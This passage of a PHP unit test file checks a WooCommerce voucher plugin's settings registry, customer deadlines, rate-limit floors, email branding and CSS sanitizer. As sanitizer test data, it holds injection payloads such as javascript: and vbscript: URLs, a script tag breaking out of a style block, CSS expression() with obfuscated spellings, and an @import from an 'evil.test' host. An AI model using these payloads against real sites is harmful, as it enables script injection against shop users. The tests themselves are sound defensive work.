check( 'SET-VC-01: saving the tab hooks the check for every number setting (priority 20, after the option\'s own sanitizer) and for no other', array() === array_filter( $sr_numbers, static fn( $k ) => count( $GLOBALS['vcap_test_filters'][ $sr_hook( $k ) ] ?? array() ) <= count( $sr_before[ $sr_hook( $k ) ] ?? array() ) ) && ( $sr_before[ $sr_hook( 'vcap_code_prefix' ) ] ?? null ) === ( $GLOBALS['vcap_test_filters'][ $sr_hook( 'vcap_code_prefix' ) ] ?? null ) && in_array( 'vcap_counter_limit_amount', $sr_numbers, true ) && str_contains( (string) file_get_contents( VCAP_PATH . 'src/Settings.php' ), "SettingsRegistry::hook_number_checks(); // SET-VC-01" ) );
$GLOBALS['vcap_test_filters'] = $sr_before;
// Filter "vcap_settings_registry": add-ons add entries (and change attributes); core entries cannot be removed.
add_filter(
	'vcap_settings_registry',
	static function ( $settings ) {
		unset( $settings['vcap_attach_pdf'] );
		// A callback that reads a setting gets the core register (no endless recursion).
		$settings['vcap_pro_sms_sender'] = array( 'default' => 'gutschein' === VCAP\Settings::value( 'vcap_coupon_link_param' ) ? 'Shop' : 'x', 'section' => 'delivery' );
		$settings['vcap_pro_sms_key']    = array( 'secret' => true, 'export' => true );
		$settings['Bad Key']             = array();
		return $settings;
	}
);
VCAP\SettingsRegistry::reset();
check( 'SET-VC-01: filter vcap_settings_registry adds settings of add-ons (secrets stay out of the export); core entries stay, invalid keys are dropped; a callback may read settings', 'Shop' === VCAP\SettingsRegistry::default( 'vcap_pro_sms_sender' ) && 'Shop' === VCAP\Settings::value( 'vcap_pro_sms_sender' ) && VCAP\SettingsRegistry::has( 'vcap_attach_pdf' ) && ! in_array( 'vcap_pro_sms_key', VCAP\SettingsRegistry::with( 'export' ), true ) && ! VCAP\SettingsRegistry::has( 'Bad Key' ) );
// SET-VC-27 (captain-pro): an add-on's option array has type "map" – export, import and WP-CLI keep its structure,
// and the validate filter gets the raw value as 4th argument.
$m27_seen = array();
add_filter(
	'vcap_settings_registry',
	static function ( $settings ) {
		$settings['vcap_pro_white_label'] = array( 'type' => 'map', 'default' => array(), 'section' => 'hidden' );
		return $settings;
	}
);
add_filter(
	'vcap_settings_validate_value',
	static function ( $result, $key, $entry, $raw = null ) use ( &$m27_seen ) {
		if ( 'vcap_pro_white_label' === $key ) {
			$m27_seen[] = $raw;
		}
		return $result;
	},
	10,
	4
);
VCAP\SettingsRegistry::reset();
$m27_in    = array( 'brand' => '<b>Shop</b> Name', 'colors' => array( 'accent' => '#123456', 'dark' => true ), 'max' => 5, 'bad key!' => 'x' );
$m27_ok    = VCAP\SettingsTransfer::validate( 'vcap_pro_white_label', $m27_in );
$m27_json  = VCAP\SettingsTransfer::validate( 'vcap_pro_white_label', '{"brand":"A","colors":{"accent":"#000"}}' );
$m27_bad   = VCAP\SettingsTransfer::validate( 'vcap_pro_white_label', 'just text' );
check(
	'SET-VC-27: type "map" keeps an add-on\'s option array (text cleaned, numbers and booleans kept, keys limited to letters, digits, _ . -), JSON objects are read, other values refused; the validate filter gets the raw value as 4th argument',
	'map' === VCAP\SettingsRegistry::get( 'vcap_pro_white_label' )['type']
		&& array( 'brand' => 'Shop Name', 'colors' => array( 'accent' => '#123456', 'dark' => true ), 'max' => 5, 'badkey' => 'x' ) === $m27_ok
		&& array( 'brand' => 'A', 'colors' => array( 'accent' => '#000' ) ) === $m27_json
		&& is_wp_error( $m27_bad ) && $m27_in === ( $m27_seen[0] ?? null ) && 3 === count( $m27_seen )
		&& str_contains( (string) file_get_contents( VCAP_PATH . 'src/CLI/Command.php' ), '\'map\' === $entry[\'type\'] && str_starts_with( ltrim( $value ), \'{\' )' ),
	wp_json_encode( array( $m27_ok, $m27_json ) )
);
unset( $GLOBALS['vcap_test_filters']['vcap_settings_validate_value'] );
unset( $GLOBALS['vcap_test_filters']['vcap_settings_registry'] );
VCAP\SettingsRegistry::reset();
check( 'SET-VC-01: config/settings.php holds data only (no translated text, no option access) and the hook is documented; Settings::DEFAULTS is replaced by Settings::defaults() (kept deprecated, PV-P2-11)', ! preg_match( '/__\(|_e\(|esc_html|get_option|update_option/', (string) file_get_contents( VCAP_PATH . 'config/settings.php' ) ) && str_contains( (string) file_get_contents( VCAP_PATH . 'docs/HOOKS.md' ), '| `vcap_settings_registry` | 1.3.0 |' ) && defined( 'VCAP\\Settings::DEFAULTS' ) && str_contains( (string) file_get_contents( VCAP_PATH . 'src/Settings.php' ), '@deprecated 1.3.0' ) );

// SET-VC-18: customer self-service and deadlines as settings (1.12 no. 16–21); defaults = the fixed values of 1.2.0,
// the filters of the same name get the setting and win.
echo "SET-VC-18 customer self-service and deadlines\n";
VCAP\SettingsRegistry::reset();
$s18_def = VCAP\Settings::defaults();
$s18_opt = static function ( array $values ): void {
	foreach ( $values as $k => $v ) {
		if ( null === $v ) {
			unset( $GLOBALS['vcap_test_options'][ $k ] );
		} else {
			$GLOBALS['vcap_test_options'][ $k ] = $v;
		}
	}
};
check(
	'SET-VC-18: defaults are today\'s values (correction link 30 days, 2 corrections, resend and change allowed, printed link 30 days, top-up 30 days, undo 10 min, counter cancellation 15 min); delivery and redemption sections',
	30 === $s18_def['vcap_recipient_fix_days'] && VCAP\Downloads::FIX_MAX === $s18_def['vcap_recipient_fix_max'] && 'yes' === $s18_def['vcap_customer_can_resend'] && 'yes' === $s18_def['vcap_customer_can_change']
		&& VCAP\Downloads::PRINTED_LINK_GRACE_DAYS === $s18_def['vcap_printed_link_grace_days'] && VCAP\TopUp::MIN_REMAINING_DAYS === $s18_def['vcap_topup_min_remaining_days'] && 10 === $s18_def['vcap_checkin_undo_minutes'] && 15 === $s18_def['vcap_counter_reversal_minutes']
		&& 'delivery' === VCAP\SettingsRegistry::get( 'vcap_recipient_fix_days' )['section'] && 'delivery' === VCAP\SettingsRegistry::get( 'vcap_printed_link_grace_days' )['section'] && 'redemption' === VCAP\SettingsRegistry::get( 'vcap_topup_min_remaining_days' )['section'] && 'redemption' === VCAP\SettingsRegistry::get( 'vcap_counter_reversal_minutes' )['section']
);
$s18_v        = new Voucher();
$s18_v->id    = 18;
$s18_v->token = 'tok18';
$s18_seen     = array();
check( 'SET-VC-18: "Correct recipient" link lifetime follows the setting (default 30, never below 1)', 30 === VCAP\Downloads::fix_days( $s18_v ) && ( $s18_opt( array( 'vcap_recipient_fix_days' => '7' ) ) || 7 === VCAP\Downloads::fix_days( $s18_v ) ) && ( $s18_opt( array( 'vcap_recipient_fix_days' => '0' ) ) || 1 === VCAP\Downloads::fix_days( $s18_v ) ) );
$s18_opt( array( 'vcap_recipient_fix_days' => '7' ) );
add_filter( 'vcap_recipient_fix_days', static function ( $days ) use ( &$s18_seen ) { $s18_seen[] = $days; return 3; } );
check( 'SET-VC-18: filter vcap_recipient_fix_days gets the setting and wins', 3 === VCAP\Downloads::fix_days( $s18_v ) && array( 7 ) === $s18_seen );
unset( $GLOBALS['vcap_test_filters']['vcap_recipient_fix_days'] );
$s18_opt( array( 'vcap_recipient_fix_days' => null, 'vcap_recipient_fix_max' => '1' ) );
$s18_fm1 = VCAP\Downloads::fix_max( $s18_v );
$s18_opt( array( 'vcap_recipient_fix_max' => '0' ) );
$s18_fm0 = VCAP\Downloads::fix_max( $s18_v );
$s18_opt( array( 'vcap_recipient_fix_max' => '9' ) );
$s18_fm9 = VCAP\Downloads::fix_max( $s18_v );
$s18_opt( array( 'vcap_recipient_fix_max' => null ) );
check( 'SET-VC-18: corrections per voucher follow the setting (1, 0 = no link), a stored value above 2 still allows only 2; default 2', 1 === $s18_fm1 && 0 === $s18_fm0 && 2 === $s18_fm9 && 2 === VCAP\Downloads::fix_max( $s18_v ) );
$s18_opt( array( 'vcap_recipient_fix_max' => '0' ) );
add_filter( 'vcap_recipient_fix_max', static fn() => 1 );
$s18_ff1 = VCAP\Downloads::fix_max( $s18_v );
unset( $GLOBALS['vcap_test_filters']['vcap_recipient_fix_max'] );
add_filter( 'vcap_recipient_fix_max', static fn() => 5 );
$s18_ff5 = VCAP\Downloads::fix_max( $s18_v );
unset( $GLOBALS['vcap_test_filters']['vcap_recipient_fix_max'] );
$s18_opt( array( 'vcap_recipient_fix_max' => null ) );
check( 'SET-VC-18: filter vcap_recipient_fix_max wins over the setting, capped at 2 as before', 1 === $s18_ff1 && 2 === $s18_ff5 );
$s18_r = array( VCAP\Downloads::resend_allowed( $s18_v ) );
$s18_opt( array( 'vcap_customer_can_resend' => 'no' ) );
$s18_r[] = VCAP\Downloads::resend_allowed( $s18_v );
add_filter( 'vcap_customer_can_resend', static fn() => true );
$s18_r[] = VCAP\Downloads::resend_allowed( $s18_v );
unset( $GLOBALS['vcap_test_filters']['vcap_customer_can_resend'] );
$s18_opt( array( 'vcap_customer_can_resend' => null ) );
check( 'SET-VC-18: resend from My Account – allowed by default, off with the setting, the filter wins', array( true, false, true ) === $s18_r && str_contains( (string) file_get_contents( VCAP_PATH . 'src/Downloads.php' ), '&& self::resend_allowed( $voucher );' ) );
$s18_c = array( VCAP\Downloads::change_allowed( $s18_v ) );
$s18_opt( array( 'vcap_customer_can_change' => 'no' ) );
$s18_c[] = VCAP\Downloads::change_allowed( $s18_v );
add_filter( 'vcap_customer_can_change', static fn() => true );
$s18_c[] = VCAP\Downloads::change_allowed( $s18_v );
unset( $GLOBALS['vcap_test_filters']['vcap_customer_can_change'] );
$s18_opt( array( 'vcap_customer_can_change' => null ) );
check( 'SET-VC-18: change a gift before delivery – allowed by default, off with the setting, the filter wins', array( true, false, true ) === $s18_c && str_contains( (string) file_get_contents( VCAP_PATH . 'src/Downloads.php' ), '&& self::change_allowed( $voucher );' ) );
$s18_g = array( VCAP\Downloads::printed_link_grace_days( $s18_v ) );
$s18_opt( array( 'vcap_printed_link_grace_days' => '0' ) );
$s18_g[] = VCAP\Downloads::printed_link_grace_days( $s18_v );
$s18_opt( array( 'vcap_printed_link_grace_days' => '365' ) );
$s18_g[] = VCAP\Downloads::printed_link_grace_days( $s18_v );
add_filter( 'vcap_printed_link_grace_days', static fn() => 5 );
$s18_g[] = VCAP\Downloads::printed_link_grace_days( $s18_v );
unset( $GLOBALS['vcap_test_filters']['vcap_printed_link_grace_days'] );
$s18_opt( array( 'vcap_printed_link_grace_days' => null ) );
check( 'SET-VC-18: printed link stays valid after expiry for the set days (30 by default, 0, 365), the new filter vcap_printed_link_grace_days wins', array( 30, 0, 365, 5 ) === $s18_g && str_contains( (string) file_get_contents( VCAP_PATH . 'src/Downloads.php' ), 'self::printed_link_grace_days( $voucher ) * DAY_IN_SECONDS' ) );
$s18_card             = new Voucher();
$s18_card->code       = 'GIFT-S18';
$s18_card->expires_at = gmdate( 'Y-m-d H:i:s', time() + 5 * DAY_IN_SECONDS );
$s18_t                = array( '' !== VCAP\TopUp::remaining_validity_error( $s18_card ) );
$s18_opt( array( 'vcap_topup_min_remaining_days' => '3' ) );
$s18_t[] = '' !== VCAP\TopUp::remaining_validity_error( $s18_card );
$s18_opt( array( 'vcap_topup_min_remaining_days' => '0' ) );
add_filter( 'vcap_topup_min_remaining_days', static fn() => 30 );
$s18_t[] = '' !== VCAP\TopUp::remaining_validity_error( $s18_card );
unset( $GLOBALS['vcap_test_filters']['vcap_topup_min_remaining_days'] );
$s18_opt( array( 'vcap_topup_min_remaining_days' => null ) );
check( 'SET-VC-18: top-up only with remaining validity – 30 days by default refuse a card valid 5 more days, setting 3 allows it, the filter wins', array( true, false, true ) === $s18_t );
$s18_ev  = static fn( string $event, ?float $amount ) => array( 'id' => 5, 'voucher_id' => 7, 'event' => $event, 'amount' => $amount, 'balance_after' => null, 'order_id' => 0, 'user_id' => 3, 'note' => '', 'created_at' => '2026-01-01 10:00:00' );
$ticket               = new Voucher();
$ticket->id           = 7;
$ticket->type         = 'ticket';
$ticket->status       = Voucher::STATUS_ACTIVE;
$ticket->max_checkins = 2;
$ticket->checkins     = 1;
$card                 = new Voucher();
$card->id             = 7;
$card->usage_mode     = 'balance';
$card->status         = Voucher::STATUS_ACTIVE;
$now                  = strtotime( '2026-01-01 10:05:00 UTC' );
$mine                 = $s18_ev( 'checkin', null );
$booking              = $s18_ev( 'redeemed', 20.0 );
$s18_u = array( Tickets::undo_mode( $ticket, $mine, 3, false, $now ) );
$s18_opt( array( 'vcap_checkin_undo_minutes' => '2' ) );
$s18_u[] = Tickets::undo_mode( $ticket, $mine, 3, false, $now );
$s18_opt( array( 'vcap_checkin_undo_minutes' => '0' ) );
$s18_u[] = Tickets::undo_mode( $ticket, $mine, 3, true, $now );
add_filter( 'vcap_checkin_undo_minutes', static fn() => 10 );
$s18_u[] = Tickets::undo_mode( $ticket, $mine, 3, false, $now );
unset( $GLOBALS['vcap_test_filters']['vcap_checkin_undo_minutes'] );
$s18_opt( array( 'vcap_checkin_undo_minutes' => null ) );
check( 'SET-VC-18: undo own check-in within the set minutes (10 by default; 2 is over after 5 minutes; 0 = managers only), the filter wins', array( 'own', '', 'reason', 'own' ) === $s18_u );
$s18_x = array( Tickets::reversal_refusal( $booking, $card, 3, false, $now, false ) );
$s18_opt( array( 'vcap_counter_reversal_minutes' => '0' ) );
$s18_x[] = Tickets::reversal_refusal( $booking, $card, 3, false, $now, false );
$s18_x[] = Tickets::reversal_refusal( $booking, $card, 3, true, $now, false );
add_filter( 'vcap_counter_reversal_minutes', static fn() => 15 );
$s18_x[] = Tickets::reversal_refusal( $booking, $card, 3, false, $now, false );
unset( $GLOBALS['vcap_test_filters']['vcap_counter_reversal_minutes'] );
$s18_opt( array( 'vcap_counter_reversal_minutes' => '120' ) );
$s18_x[] = Tickets::reversal_refusal( $booking, $card, 3, false, $now + 3600, false );
$s18_opt( array( 'vcap_counter_reversal_minutes' => null ) );
check( 'SET-VC-18: cancel own counter redemption within the set minutes (15 by default; 0 = managers only; 120 still after an hour), the filter wins', array( '', 'forbidden', '', '', '' ) === $s18_x );

// SET-VC-31: limits against code guessing as settings with a floor (1.12 no. 22–24).
echo "SET-VC-31 limits against code guessing\n";
$s31_floor = static fn( string $k ) => VCAP\SettingsRegistry::get( $k )['min'];
$s31_san   = static fn( $v, $k ) => VCAP\SettingsRegistry::sanitize_option( $v, array( 'id' => $k ) );
check(
	'SET-VC-31: defaults are today\'s values and every limit has a floor above 0 (no setting switches a protection off); saving 0 stores the floor',
	VCAP\CodeLookup::PER_VISITOR === VCAP\Settings::value( 'vcap_code_attempts_per_visitor' ) && VCAP\CodeLookup::SITE_WIDE === VCAP\Settings::value( 'vcap_code_attempts_site_wide' ) && 300 === VCAP\Settings::value( 'vcap_redemption_site_wide_failures' )
		&& VCAP\PersonalVoucher::SEND_PER_HOUR === VCAP\Settings::value( 'vcap_email_confirm_per_hour' ) && VCAP\PersonalVoucher::LINK_LIFETIME === VCAP\Settings::value( 'vcap_email_confirm_link_hours' ) * HOUR_IN_SECONDS
		&& 3 === $s31_floor( 'vcap_code_attempts_per_visitor' ) && 50 === $s31_floor( 'vcap_code_attempts_site_wide' ) && 50 === $s31_floor( 'vcap_redemption_site_wide_failures' ) && 1 === $s31_floor( 'vcap_email_confirm_per_hour' ) && 1 === $s31_floor( 'vcap_email_confirm_link_hours' )
		&& '3' === $s31_san( '0', 'vcap_code_attempts_per_visitor' ) && '50' === $s31_san( '0', 'vcap_code_attempts_site_wide' ) && '1' === $s31_san( '0', 'vcap_email_confirm_per_hour' ) && '100' === $s31_san( '100000', 'vcap_code_attempts_per_visitor' ) && '168' === $s31_san( '9999', 'vcap_email_confirm_link_hours' )
);
$s31_limits = array();
add_filter(
	'vcap_rate_limit_code',
	static function ( $limits ) use ( &$s31_limits ) {
		$s31_limits[] = $limits;
		return array( 'per_visitor' => 0 ) + $limits; // Stop here (no counter in the unit tests).
	}
);
VCAP\CodeLookup::begin();
$GLOBALS['vcap_test_options']['vcap_code_attempts_per_visitor'] = '8';
$GLOBALS['vcap_test_options']['vcap_code_attempts_site_wide']   = '1000';
VCAP\CodeLookup::begin();
// Written past the settings page (update_option(), import): the floor still holds.
$GLOBALS['vcap_test_options']['vcap_code_attempts_per_visitor'] = '0';
$GLOBALS['vcap_test_options']['vcap_code_attempts_site_wide']   = '-5';
VCAP\CodeLookup::begin();
unset( $GLOBALS['vcap_test_options']['vcap_code_attempts_per_visitor'], $GLOBALS['vcap_test_options']['vcap_code_attempts_site_wide'] );
check(
	'SET-VC-31: every code form counts with the set limits (15/300 by default, 8/1000 set); a stored 0 reads as the floor 3/50; filter vcap_rate_limit_code still gets them and wins',
	array( array( 'per_visitor' => 15, 'site_wide' => 300 ), array( 'per_visitor' => 8, 'site_wide' => 1000 ), array( 'per_visitor' => 3, 'site_wide' => 50 ) ) === $s31_limits && false === VCAP\CodeLookup::begin()
);
unset( $GLOBALS['vcap_test_filters']['vcap_rate_limit_code'] );
$s31_seen = array();
add_filter( 'vcap_redemption_site_wide_failures', static function ( $n ) use ( &$s31_seen ) { $s31_seen[] = $n; return $n; } );
add_filter( 'vcap_rate_limit_redemption', static fn( $limits ) => array( 'per_visitor' => 0 ) + $limits );
add_filter( 'vcap_rate_limit_code', static fn( $limits ) => array( 'per_visitor' => 0 ) + $limits );
$s31_rs  = ( new ReflectionClass( VCAP\API\V1\RedemptionService::class ) )->newInstanceWithoutConstructor();
$s31_tmf = new ReflectionMethod( VCAP\API\V1\RedemptionService::class, 'too_many_failures' );
$s31_r1 = $s31_tmf->invoke( $s31_rs, 5 );
$GLOBALS['vcap_test_options']['vcap_redemption_site_wide_failures'] = '20';
$s31_tmf->invoke( $s31_rs, 5 );
$GLOBALS['vcap_test_options']['vcap_redemption_site_wide_failures'] = '600';
$s31_tmf->invoke( $s31_rs, 5 );
unset( $GLOBALS['vcap_test_options']['vcap_redemption_site_wide_failures'], $GLOBALS['vcap_test_filters']['vcap_redemption_site_wide_failures'], $GLOBALS['vcap_test_filters']['vcap_rate_limit_redemption'], $GLOBALS['vcap_test_filters']['vcap_rate_limit_code'] );
check( 'SET-VC-31: redemption API – the site-wide brake follows the setting (300 by default, 20 stored reads as the floor 50, 600) and filter vcap_redemption_site_wide_failures gets it', false === $s31_r1 && array( 300, 50, 600 ) === $s31_seen );
$s31_p = array( VCAP\PersonalVoucher::link_lifetime(), VCAP\PersonalVoucher::send_per_hour(), VCAP\PersonalVoucher::validity_sentence() );
$GLOBALS['vcap_test_options']['vcap_email_confirm_link_hours'] = '24';
$GLOBALS['vcap_test_options']['vcap_email_confirm_per_hour']   = '0';
$s31_p = array_merge( $s31_p, array( VCAP\PersonalVoucher::link_lifetime(), VCAP\PersonalVoucher::send_per_hour(), VCAP\PersonalVoucher::validity_sentence() ) );
$GLOBALS['vcap_test_options']['vcap_email_confirm_link_hours'] = '1000';
$s31_p[] = VCAP\PersonalVoucher::link_lifetime();
unset( $GLOBALS['vcap_test_options']['vcap_email_confirm_link_hours'], $GLOBALS['vcap_test_options']['vcap_email_confirm_per_hour'] );
$s31_pv = (string) file_get_contents( VCAP_PATH . 'src/PersonalVoucher.php' );
check(
	'SET-VC-31: personal vouchers – confirmation link 48 h and 3 mails per hour by default; 24 h set (the email names it), a stored 0 mails reads as 1, at most 168 h',
	array( 172800, 3, 'The link is valid for 48 hours. If you did not ask for it, you can ignore this email.', 86400, 1, 'The link is valid for 24 hours. If you did not ask for it, you can ignore this email.', 168 * HOUR_IN_SECONDS ) === $s31_p
		&& str_contains( $s31_pv, "rate_limited( 'email_confirm', self::send_per_hour()," ) && str_contains( $s31_pv, 'time() + self::link_lifetime();' ),
	wp_json_encode( $s31_p )
);
// SET-VC-29: accent colour and logo of the voucher emails (default: WooCommerce), test email to the current user.
echo "SET-VC-29 email appearance and test email\n";
$b29 = 'VCAP\Emails\Branding';
check( 'SET-VC-29: accent colour and logo are registered in "Delivery & downloads" with an empty default (WooCommerce settings apply), exported, no legal weight', '' === VCAP\SettingsRegistry::default( 'vcap_email_color' ) && '' === VCAP\SettingsRegistry::default( 'vcap_email_logo' ) && 'delivery' === VCAP\SettingsRegistry::get( 'vcap_email_color' )['section'] && 'delivery' === VCAP\SettingsRegistry::get( 'vcap_email_logo' )['section'] && in_array( 'vcap_email_logo', VCAP\SettingsRegistry::with( 'export' ), true ) && ! in_array( 'vcap_email_color', VCAP\SettingsRegistry::with( 'legal' ), true ) );
unset( $GLOBALS['vcap_test_options']['vcap_email_color'], $GLOBALS['vcap_test_options']['vcap_email_logo'], $GLOBALS['vcap_test_options']['woocommerce_email_base_color'] );
$b29_fallback = $b29::base_color();
$GLOBALS['vcap_test_options']['woocommerce_email_base_color'] = '#7f54b3';
$b29_wc = $b29::base_color();
$GLOBALS['vcap_test_options']['vcap_email_color'] = '#AA0000';
$b29_own = $b29::base_color();
check( 'SET-VC-29: base colour = own accent colour, else the WooCommerce base colour, else #1f3a4d (existing shops look the same)', '#1f3a4d' === $b29_fallback && '#7f54b3' === $b29_wc && '#aa0000' === $b29_own );
$GLOBALS['vcap_test_filters']['vcap_setting_vcap_email_color'][] = array( static fn( $v ) => '#00ff00', 1 );
$b29_filtered = $b29::base_color();
unset( $GLOBALS['vcap_test_filters']['vcap_setting_vcap_email_color'] );
check( 'SET-VC-29: the filter vcap_setting_vcap_email_color wins over the stored colour', '#00ff00' === $b29_filtered );
check( 'SET-VC-29: colour and logo are stored checked (hex colour or empty; http(s) URL or empty)', '#abc' === $b29::sanitize_color( ' #ABC ' ) && '' === $b29::sanitize_color( 'red;background:url(x)' ) && '' === $b29::sanitize_color( array() ) && 'https://shop.test/logo.png' === $b29::sanitize_logo( ' https://shop.test/logo.png ' ) && '' === $b29::sanitize_logo( 'javascript:alert(1)' ) && '' === $b29::sanitize_logo( '//evil.test/x.png' ) );
$GLOBALS['vcap_test_options']['vcap_email_logo'] = 'https://shop.test/logo.png';
$b29_inside = array();
$b29_result = $b29::during(
	static function () use ( $b29, &$b29_inside ) {
		$b29_inside = array( has_filter( 'pre_option_woocommerce_email_header_image' ), has_filter( 'pre_option_woocommerce_email_base_color' ), apply_filters( 'pre_option_woocommerce_email_header_image', false ), apply_filters( 'pre_option_woocommerce_email_base_color', false ) );
		return $b29::during( static fn() => 'nested' );
	}
);
check( 'SET-VC-29: while a voucher email is rendered, WooCommerce\'s header image and base colour read the shop\'s logo and colour; afterwards the filters are gone (other shop emails unchanged)', 'nested' === $b29_result && array( true, true, 'https://shop.test/logo.png', '#aa0000' ) === $b29_inside && ! has_filter( 'pre_option_woocommerce_email_header_image' ) && ! has_filter( 'pre_option_woocommerce_email_base_color' ) );
unset( $GLOBALS['vcap_test_options']['vcap_email_color'], $GLOBALS['vcap_test_options']['vcap_email_logo'] );
check( 'SET-VC-29: with empty settings the WooCommerce values stay (pre_option passes false through)', false === $b29::pre_logo( false ) && false === $b29::pre_color( false ) );
$b29_src = (string) file_get_contents( VCAP_PATH . 'src/Emails/VoucherEmail.php' ) . file_get_contents( VCAP_PATH . 'src/Emails/BonusEmail.php' ) . file_get_contents( VCAP_PATH . 'src/Emails/GiftNoticeEmail.php' );
check( 'SET-VC-29: every Voucher Captain email renders and styles through Branding::during(); colors() takes Branding::base_color() and keeps the filter vcap_email_colors', 3 === substr_count( $b29_src, 'Branding::during( fn() => parent::get_content() )' ) && 3 === substr_count( $b29_src, 'Branding::during( fn() => parent::style_inline( $content ) )' ) && str_contains( $b29_src, '$base = Branding::base_color();' ) && str_contains( $b29_src, "apply_filters( 'vcap_email_colors', \$colors )" ) );
// Test email: at most 5 per user and hour, only to the user's own address.
$GLOBALS['vcap_test_transients'] = array();
$b29_to   = array();
$b29_send = static function ( string $address ) use ( &$b29_to ) {
	$b29_to[] = $address;
	return true;
};
$b29_runs = array();
for ( $b29_i = 0; $b29_i < 6; $b29_i++ ) {
	$b29_runs[] = VCAP\Preview::send_test_email( 7, 'admin@shop.test', $b29_send );
}
check( 'SET-VC-29: test emails – 5 per user and hour, the 6th is refused; each one only to the user\'s own address', array( 'sent', 'sent', 'sent', 'sent', 'sent', 'limit' ) === $b29_runs && array_fill( 0, 5, 'admin@shop.test' ) === $b29_to && 0 === VCAP\Preview::test_email_quota( 7 ) && 5 === VCAP\Preview::test_email_quota( 8 ) );
$GLOBALS['vcap_test_transients'][ VCAP\Preview::TEST_MAIL_TRANSIENT . '7' ] = array( time() - 2 * HOUR_IN_SECONDS, time() - HOUR_IN_SECONDS - 5, time() - 60 );
check( 'SET-VC-29: test emails older than an hour no longer count; no address or no user sends nothing; a failing mail counts as well', 4 === VCAP\Preview::test_email_quota( 7 ) && 'no_address' === VCAP\Preview::send_test_email( 7, 'not-an-address', $b29_send ) && 'no_address' === VCAP\Preview::send_test_email( 0, 'admin@shop.test', $b29_send ) && 'failed' === VCAP\Preview::send_test_email( 7, 'admin@shop.test', static fn() => false ) && 3 === VCAP\Preview::test_email_quota( 7 ) && 5 === count( $b29_to ) );
$GLOBALS['vcap_test_transients'] = array();
$b29_prev = (string) file_get_contents( VCAP_PATH . 'src/Preview.php' );
check( 'SET-VC-29: the test email handler checks the capability and the nonce before sending, sends with no attachment and not to additional recipients', (bool) preg_match( "/function test_email_request\(\): void \{\s*if \( ! current_user_can\( 'manage_woocommerce' \) \) \{\s*wp_die\([^\n]*\n\s*\}\s*check_admin_referer\( self::TEST_MAIL_ACTION \);/", $b29_prev ) && str_contains( $b29_prev, '$email->send( $address, $subject, $email->get_content(), $email->get_headers(), array() )' ) && ! str_contains( $b29_prev, 'extra_recipients' ) );
$b29_fields = ( new VCAP\Settings() )->fields( 'delivery' );
$b29_types  = array_column( $b29_fields, 'type', 'id' );
check( 'SET-VC-29: "Delivery & downloads" shows accent colour, logo and the test email button (no option)', 'color' === ( $b29_types['vcap_email_color'] ?? '' ) && 'text' === ( $b29_types['vcap_email_logo'] ?? '' ) && 'vcap_test_email' === ( $b29_types['vcap_test_email'] ?? '' ) );

// SET-VC-30: additional CSS for the redeem form and the account area.
echo "SET-VC-30 additional CSS\n";
check( 'SET-VC-30: "Additional CSS" is a text setting of "Delivery & downloads" with an empty default and a textarea field', 'text' === VCAP\SettingsRegistry::get( 'vcap_custom_css' )['type'] && 'delivery' === VCAP\SettingsRegistry::get( 'vcap_custom_css' )['section'] && '' === VCAP\SettingsRegistry::default( 'vcap_custom_css' ) && 'textarea' === ( $b29_types['vcap_custom_css'] ?? '' ) );
$c30 = 'VCAP\CustomCss';
check(
	'SET-VC-30: stored cleaned – tags and "</style" removed, expression(), javascript:/vbscript: URLs, behaviours, bindings and @import removed (also spelled with escapes or comments), child selectors kept',
	'.vcap-redeem > button { color: #c00; }' === $c30::sanitize( '.vcap-redeem > button { color: #c00; }' )
	&& ! str_contains( strtolower( $c30::sanitize( 'a{color:red}</style><script>alert(1)</script>' ) ), '<' )
	&& ! str_contains( strtolower( $c30::sanitize( 'a{color:red}</STYLE ><b>x' ) ), 'style' )
	&& ! preg_match( '/expression|javascript|vbscript|@import|behavior|binding/i', $c30::sanitize( "a{width:expression(alert(1));background:url(javascript:alert(1));b:url( vbscript:x)}\n@import url(https://evil.test/x.css);\nb{behavior:url(x.htc);-moz-binding:url(x.xml#y)}" ) )
	&& ! preg_match( '/expression|javascript/i', $c30::sanitize( 'a{width:expr\\65ssion(1);w:e/**/xpression(1);background:url(java\\script:alert(1));c:url(jav ascript:x)}' ) )
	&& ! preg_match( '/javascript/i', $c30::sanitize( 'a{background:url(javajavascript:script:alert(1))}' ) )
	&& '' === $c30::sanitize( array( 'x' ) )
);
check( 'SET-VC-30: at most 10000 characters are stored; the save filter cleans the raw input (WooCommerce would turn ">" into "&gt;")', $c30::MAX_LENGTH === mb_strlen( $c30::sanitize( str_repeat( 'a{b:c}', 3000 ) ) ) && 'a > b{c:d}' === $c30::sanitize_option( 'a &gt; b{c:d}', array( 'id' => 'vcap_custom_css' ), 'a > b{c:d}<script>' ) );
if ( ! function_exists( 'wp_style_is' ) ) {
	function wp_style_is( $h, $l = 'enqueued' ) { return 'registered' === $l ? isset( $GLOBALS['vcap_test_styles']['registered'][ $h ] ) : isset( $GLOBALS['vcap_test_styles']['enqueued'][ $h ] ); }
	function wp_register_style( $h, $src, $deps = array(), $ver = false ) { $GLOBALS['vcap_test_styles']['registered'][ $h ] = array( $src, $deps ); return true; }
	function wp_enqueue_style( $h ) { $GLOBALS['vcap_test_styles']['enqueued'][ $h ] = true; }
	function wp_add_inline_style( $h, $css ) { $GLOBALS['vcap_test_styles']['inline'][ $h ][] = $css; return true; }
}
if ( ! function_exists( 'wp_script_is' ) ) {
	function wp_script_is( $h, $l = 'enqueued' ) { return true; }
}
$GLOBALS['vcap_test_styles'] = array();
$c30::reset();
unset( $GLOBALS['vcap_test_options']['vcap_custom_css'] );
VCAP\Downloads::enqueue_style();
$c30_empty = $GLOBALS['vcap_test_styles'];
$GLOBALS['vcap_test_options']['vcap_custom_css'] = '.vcap-balance{color:#123}';
VCAP\Downloads::enqueue_style();
VCAP\Downloads::enqueue_style();
check( 'SET-VC-30: printed with the storefront style where plugin output enqueues it (once per page, after "vcap-frontend"); nothing when empty', ! isset( $c30_empty['enqueued'][ $c30::HANDLE ] ) && isset( $c30_empty['enqueued']['vcap-frontend'] ) && array( '.vcap-balance{color:#123}' ) === ( $GLOBALS['vcap_test_styles']['inline'][ $c30::HANDLE ] ?? null ) && isset( $GLOBALS['vcap_test_styles']['enqueued'][ $c30::HANDLE ] ) && array( false, array( 'vcap-frontend' ) ) === ( $GLOBALS['vcap_test_styles']['registered'][ $c30::HANDLE ] ?? null ) );
$c30_dl = (string) file_get_contents( VCAP_PATH . 'src/Downloads.php' );
